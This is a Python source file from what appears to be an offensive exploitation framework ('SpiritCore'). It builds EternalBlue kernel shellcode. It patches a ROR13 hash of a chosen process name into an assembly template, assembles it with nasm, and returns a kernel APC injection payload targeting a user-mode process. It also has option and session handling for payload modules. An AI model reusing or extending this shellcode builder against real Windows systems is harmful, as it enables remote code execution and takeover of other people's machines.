from SpiritCore.System import *
from keystone import*


class ShellCode:
    Architecture="x64"
    def __init__(self,Object,PayloadName,Parameate):
        self.Object=Object
        self.PayloadName=PayloadName
        self.Parameate=Parameate
    def AsmToBin(self):
        pass
    def raw_shellcode(self):
        Object = self.Object.Payload[self.PayloadName]
        Object.Parameate=self.Parameate
        return Object.Generate()

    def Ring0ApcInjectRing3Shellcode(self,ProcessName,Architecture):
        print_msg("Build ShellCode")
        Hash = bytes(self.compute_api_hash(ProcessName+"\x00"), encoding="utf8")
        
        AsmCode= open("SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64.asm","rb").read().replace(b"Process_Hash",Hash)
        Build = "SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64_Build.asm"
        open("SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64_Build.asm", "wb+").write(AsmCode)
        import os
        BuildBin="SpiritCore/Lib/Lib/Windows/eternalblue_kshellcode_x64_Build.bin"
        CmdLine =[]
        CmdLine.append("nasm")
        CmdLine.append(Build)
        CmdLine.append("-o")
        CmdLine.append(BuildBin)
        os.system(" ".join(CmdLine))
        Bin=open(BuildBin,"rb+").read()
        print_success("Build Kernel Ring0 APC Inject Thread to Ring3 ShellCode length:%d"%len(Bin))
        return Bin
    def compute_api_hash(self,key, num=13):
        """
        Compute hash of WinApi functions
        """
        hash = 0
        while key:
            c_ptr = ord(key[0])
            hash = (hash << (32 - num)) & 0xffffffff | (hash >> num) & 0xffffffff
            hash += c_ptr
            key = key[1:]
        hash = "0x%08x" % hash
        return hash


class Payload:
    Name=""
    Object=None
    Values={}
    required={}
    description={}
    Parameate = {}

    def SetUUidSession(self,UUID):
        try:
            Ret = self.SessionInfo()
        except:
            Ret = self.Name
        self.Object.SessionManager[UUID].SessionInfo=Ret
    def Init(self):
        SetKey = []
        self.Parameate={}
        for key in sorted(self.Object.Values):
            self.Parameate.update({key:self.Object.Values[key]})
        if self.Object.UsePayload == True:
            for key in sorted(self.Object.PayloadParameate):
                self.Parameate.update({key:self.Object.PayloadParameate[key]})
                self.Object.UsePayloadObject.Parameate.update({key:self.Object.PayloadParameate[key]})

    def GetParameate(self, Name):
        return self.Values
        Parame = self.Info.get("Options")
        for parameater in Parame:
            try:
                self.r_option(*parameater)
            except Exception as e:
                print_error(e)

            return self.Values
        else:
            print_error("Not Payload:%s" % Name)
    def Inti(self,Object):
        self.Object=Object
        self.Values = {}
        self.required = {}
        self.description = {}
        self.Parameate = {}

    def r_option(self, name, value=None, required=False, description=''):
        self.Values[name] = self.SetLoadvalue(value)
        self.required[name] = required
        self.description[name] = description

    def SetLoadvalue(self, value):
        orig = value
        if value in (None, True, False): return value
        if isinstance(value, str) and value.lower() in ('none', '""', "''"):
            return None
        for type_ in (self.r_bool, int, float):
            try:
                value = type_(value)
                break
            except KeyError:
                pass
            except ValueError:
                pass
            except AttributeError:
                pass
        if type(value) is int and '.' in str(orig):
            return float(orig)
        return value

    def r_bool(self, value):
        return {'true': True, 'false': False}[value.lower()]